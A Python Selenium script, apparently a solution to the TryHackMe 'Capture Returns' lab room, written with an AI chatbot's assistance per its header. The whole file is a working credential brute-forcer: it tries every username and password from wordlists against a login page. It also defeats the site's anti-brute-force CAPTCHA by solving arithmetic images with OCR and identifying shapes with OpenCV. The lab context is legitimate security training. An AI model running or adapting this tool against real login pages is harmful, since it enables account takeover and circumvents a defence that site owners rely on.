# script to solve room Capture Returns from tryhackme
# https://tryhackme.com/r/room/capturereturns
# script with assistance of ChatGPT
# need to update machine  IP and user.txt and pass.txt files below

import time
import base64
from PIL import Image, ImageEnhance, ImageFilter
import pytesseract
from io import BytesIO
import re
import cv2
import numpy as np
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException, TimeoutException
from selenium.webdriver.chrome.service import Service as ChromeService

options = Options()
options.add_argument('--headless')
options.add_argument('--no-sandbox')
options.add_argument('--disable-dev-shm-usage')

def read_file(file_path):
    """ Reads a file and returns a list of lines. """
    with open(file_path, 'r') as file:
        return [line.strip() for line in file]

def solve_captcha(captcha_src):
    try:
        base64_image = captcha_src.split(',')[1]
        image_bytes = base64.b64decode(base64_image)
        img = Image.open(BytesIO(image_bytes))
        img = img.convert('L')  # Convert to grayscale

        # Applying Gaussian Blur
        img = img.filter(ImageFilter.GaussianBlur(radius=1))

        # Enhance image contrast
        enhancer = ImageEnhance.Contrast(img)
        img = enhancer.enhance(2)

        # Binarization using adaptive threshold
        np_img = np.array(img)
        np_img = cv2.adaptiveThreshold(np_img, 255, cv2.ADAPTIVE_THRESH_GAUSSIAN_C, 
                                       cv2.THRESH_BINARY, 11, 2)

        # Convert numpy array back to PIL Image for OCR
        img = Image.fromarray(np_img)
        
        # Setting Tesseract to recognize numbers only
        custom_config = r'--oem 3 --psm 6 outputbase digits'
        #text = pytesseract.image_to_string(img, config=custom_config)
        text = pytesseract.image_to_string(img, config='--psm 6')
        print(f"OCR extracted text: {text}")
        #time.sleep(3)  # Pause here to see the OCR output

        match = re.search(r'(\d+)\s*([\+\-\*/])\s*(\d+)', text)
        if match:
            num1, operator, num2 = int(match.group(1)), match.group(2), int(match.group(3))
            result = {
                '+': num1 + num2,
                '-': num1 - num2,
                '*': num1 * num2,
                '/': num1 / num2 if num2 != 0 else 'undefined'
            }[operator]
            return str(result)


#        match = re.search(r'(\d+)\s*([\+\-\*/])\s*(\d+)', text)
#        if match:
#            num1, operator, num2 = int(match.group(1)), match.group(2), int(match.group(3))
#            result = eval(f"{num1}{operator}{num2}")
#            return str(result)
        # If no numbers, try shape detection
        # Convert PIL Image to an OpenCV format
        img_cv = np.array(img)
        img_cv = cv2.threshold(img_cv, 127, 255, cv2.THRESH_BINARY_INV)[1]  # Threshold to binary

        # Detect contours
        contours, _ = cv2.findContours(img_cv, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
        for cnt in contours:
            approx = cv2.approxPolyDP(cnt, 0.01 * cv2.arcLength(cnt, True), True)
            if len(approx) == 3:
                return "triangle"
            elif len(approx) == 4:
                rect = cv2.boundingRect(approx)
                ar = rect[2] / rect[3]
                return "square" if 0.95 < ar < 1.05 else "Rectangle"
            elif len(approx) > 4:
                return "circle"

        return "Unidentified"

    except Exception as e:
        print(f"Failed to solve CAPTCHA: {e}")
        return None

def attempt_login(username, password, driver):
    """ Attempts to log in and solve CAPTCHA if required. """
    driver.get("http://10.10.68.112/login")
    try:
        login_attempted = False
        while not login_attempted:
            if is_login_form_present(driver):
                print(f"Trying to login with username: {username} and password: {password}")
                login(username, password, driver)
                login_attempted = True  # Set to True after attempting login
            elif is_captcha_present(driver):
                print("CAPTCHA found, solving...")
                solve_and_submit_captcha(driver)
            else:
                print("Neither login form nor CAPTCHA present, checking page status...")
                break  # This might indicate a successful login or an unexpected page state.

            # Additional check to break loop if we are not on the login or CAPTCHA page
            if "Logged in successfully" in driver.page_source:
                print(f"Login successful with username: {username} and password: {password}")
                break
            #time.sleep(1)  # Slight delay to allow for page updates

    except Exception as e:
        print(f"An unexpected error occurred: {e}")
def is_login_form_present(driver):
    """ Check if the login form is present. """
    try:
        return driver.find_element(By.NAME, "username").is_displayed()
    except NoSuchElementException:
        return False

def is_captcha_present(driver):
    """ Check if a CAPTCHA is present. """
    try:
        return driver.find_element(By.TAG_NAME, "img").get_attribute('src').startswith('data:image/png;base64,')
    except NoSuchElementException:
        return False

def login(username, password, driver):
    """ Input credentials and submit the login form. """
    driver.find_element(By.NAME, "username").clear()
    driver.find_element(By.NAME, "username").send_keys(username)
    driver.find_element(By.NAME, "password").clear()
    driver.find_element(By.NAME, "password").send_keys(password)
    driver.find_element(By.CSS_SELECTOR, "button.login_button").click()
    # Printing all text on the page after attempting to log in
    #time.sleep(5)  # Wait a bit for the page to load fully, adjust as necessary
    body_text = driver.find_element(By.TAG_NAME, 'body').text
    print("Page text after login attempt:\n", body_text)
    # Add a delay to wait for page to load or for redirection
    #time.sleep(5)  # Adjust timing based on expected delay

    # Here you would check if login is successful
        # Check if the login failed message is displayed
    if "Detected 3 incorrect login attempts!" in driver.page_source:
      print(f"Login attempt with username: {username} and password: {password} triggered CAPTCHA.")
    else:
      print(f"Login successful with username: {username} and password: {password}")

def solve_and_submit_captcha(driver):
    """ Solve CAPTCHA and submit the solution, clearing previous input first. """
    captcha_src = driver.find_element(By.TAG_NAME, "img").get_attribute('src')
    captcha_solution = solve_captcha(captcha_src)
    captcha_field = driver.find_element(By.NAME, "captcha")
    captcha_field.clear()  # Clear the field before entering a new solution
    if captcha_solution:
        captcha_field.send_keys(captcha_solution)
        driver.find_element(By.CSS_SELECTOR, "button.login_button").click()

def chrome_webdriver():
 chromedriver_path = '/usr/bin/chromedriver'
 user_agent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) ' \
              'Chrome/123.0.0.0 Safari/537.36'
 options = webdriver.ChromeOptions()
 options.add_argument("--start-maximized")
 options.add_argument('--headless')
 options.add_argument(f'user-agent={user_agent}')
 service = Service(executable_path=chromedriver_path)
 driver = webdriver.Chrome(service=service, options=options)
 return driver
def main():
    #driver = webdriver.Chrome()
    #driver = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()))
    #driver = chrome_webdriver()
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
    usernames = read_file('user.txt')
    passwords = read_file('pass.txt')

    for username in usernames:
        for password in passwords:
            attempt_login(username, password, driver)
            if "Logged in successfully" in driver.page_source:
                print(f"Successfully logged in with {username} and {password}")
                break  # Break the inner loop if login is successful
        else:
            continue  # Only executed if the inner loop did NOT break
        break  # Break the outer loop if the inner loop was broken

    driver.quit()

if __name__ == "__main__":
    main()

